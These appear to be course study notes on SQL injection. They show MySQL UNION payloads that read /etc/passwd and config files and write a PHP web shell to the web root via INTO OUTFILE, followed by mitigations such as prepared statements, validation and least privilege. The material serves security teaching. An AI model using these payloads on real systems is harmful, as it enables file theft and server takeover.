Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Similar to how we have been using a `UNION` injection, we can use the above query:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

![image.png](image%2043.png)

### Another Example

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
--
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

![image.png](image%2044.png)

However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.

![image.png](image%2045.png)

# Writing Files

## Overview

Writing files to the backend server is restricted in modern DBMSes due to security concerns. Gaining the ability to write files, especially web shells, could lead to code execution and server compromise. Here are the steps and considerations necessary to write files via a MySQL database.

## File Writing Requirements

To write files to the backend server using MySQL, the following conditions must be met:

1. **User with FILE privilege enabled.**
2. **MySQL global `secure_file_priv` variable must not be enabled.**
3. **Write access to the target location on the server.**

## Checking Privileges

### Step 1: Verify `FILE` Privilege

- The current user needs the FILE privilege, which has already been confirmed.
- Next, we need to ensure that the `secure_file_priv` allows file operations.

### Step 2: Checking `secure_file_priv`

- This variable controls the directories for file operations.
    - **Empty Value**: Full file system access.
    - **Set to a directory**: Access restricted to that directory.
    - **NULL**: No file read/write access.
- MariaDB defaults to an empty value, while MySQL typically restricts access to `/var/lib/mysql-files` or sets it to NULL.

### Retrieving `secure_file_priv` Value

To get the current setting using SQL:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

In case of a UNION injection, use the following query:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv";
```

**Example UNION Payload**:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

If the result shows an empty value, file read/write operations are allowed.

![image.png](image%2046.png)

## Writing Files with `SELECT INTO OUTFILE`

### Exporting Data

The `SELECT INTO OUTFILE` command can be used to write the result of a query to a file:

```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials';
```

**Example Output**:

```
1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45
```

### Writing Arbitrary Text

To write custom content:

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

**Command to View Content**:

```bash
cat /tmp/test.txt
```

**Output**:

```
this is a tes
```

The file `test.txt` is owned by the `mysql` user.

### Advanced File Exports

- Advanced file exports utilize the '**`FROM_BASE64("base64_data")`**' function in order to be able to write long/advanced files, including binary data.

## Writing Files via SQL Injection

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

### Writing a Test File

To verify write access, attempt to write a text file to the web root:

```sql
SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';
```

**Example UNION Injection**:

```sql
cn' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Check if the file exists:

![image.png](image%2047.png)

If successful, the file will be present in the web root.

## Writing a Web Shell

After confirming write permissions, create a PHP web shell:

```php
<?php system($_REQUEST[0]); ?
```

**UNION Injection to Write Web Shell**:

```sql
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

To verify, access the web shell and execute a command:

```
http://SERVER_IP:PORT/shell.php?0=id
```

If successful, the output will display the command execution, confirming access.

![image.png](image%2048.png)

To search for other items within the machine we will need to URL encode all the messages.

# Mitigating SQL Injection: Strategies and Techniques

## Introduction

SQL Injection vulnerabilities can lead to severe security risks, including unauthorized access and data breaches. Below are methods to mitigate SQL injection threats, with examples primarily in PHP.

## 1. Input Sanitization

Sanitizing user input helps to neutralize malicious data. Libraries provide functions to escape special characters, preventing SQL injection.

### Example: Authentication Code Vulnerability

**Vulnerable Code**:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username='". $username . "' AND password = '" . $password . "';";
```

### Solution: Using `mysqli_real_escape_string()`

To escape special characters:

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username . "' AND password = '" . $password . "';";
```

This prevents SQL injection by escaping characters like `'` and `"`.

**Note**: For PostgreSQL, use `pg_escape_string()`.

## 2. Input Validation

Input validation ensures that the user input matches the expected format, reducing the risk of injections.

### Example: Validating GET Parameter

**Vulnerable Code**:

```php
if (isset($_GET["port_code"])) {
    $q = "SELECT * FROM ports WHERE port_code ILIKE '%" . $_GET["port_code"] . "%'";
    $result = pg_query($conn, $q);
}
```

### Solution: Using Regular Expressions

Validate input to allow only specific characters:

```php
$pattern = "/^[A-Za-z\\s]+$/";
$code = $_GET["port_code"];

if (!preg_match($pattern, $code)) {
    die("Invalid input! Please try again.");
}

$q = "SELECT * FROM ports WHERE port_code ILIKE '%" . $code . "%'"
```

The pattern `[A-Za-z\\s]+` only allows letters and spaces.

## 3. Least Privilege for Database Users

Ensure that the database user only has the necessary permissions for the web application. Avoid using superusers or accounts with administrative privileges.

### Example: Creating a Restricted User

```sql
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

This creates a user with read-only access to the `ports` table, limiting exposure.

### Verification

```
mysql -u reader -p
MariaDB [(none)]> USE ilfreight;
MariaDB [ilfreight]> SHOW TABLES;
MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
-- ERROR: SELECT command denied for user 'reader'
```

## 4. Use a Web Application Firewall (WAF)

Web Application Firewalls help block common SQL injection patterns. They can be open-source (e.g., ModSecurity) or commercial (e.g., Cloudflare). Default rules can reject malicious requests, such as those containing `INFORMATION_SCHEMA`.

## 5. Parameterized Queries

Parameterized queries are a secure way to handle user inputs by using placeholders instead of directly embedding data in SQL statements.

### Example: Using Parameterized Queries

**Original Vulnerable Code**:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username='" . $username . "' AND password='" . $password . "';";
```

**Solution: Use Prepared Statements**:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
$row = mysqli_fetch_array($result);
mysqli_stmt_close($stmt);
```

The query is modified to contain two placeholders, marked with `?` where the username and password will be placed. We then bind the username and password to the query using the [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php) function. This will safely escape any quotes and place the values in the query.

Prepared statements ensure that user input is properly escaped before being executed.

Mitigating SQL injection requires a combination of strategies including input sanitization, validation, least privilege principles, WAF implementation, and the use of parameterized queries. While the examples are in PHP, the principles apply across programming languages.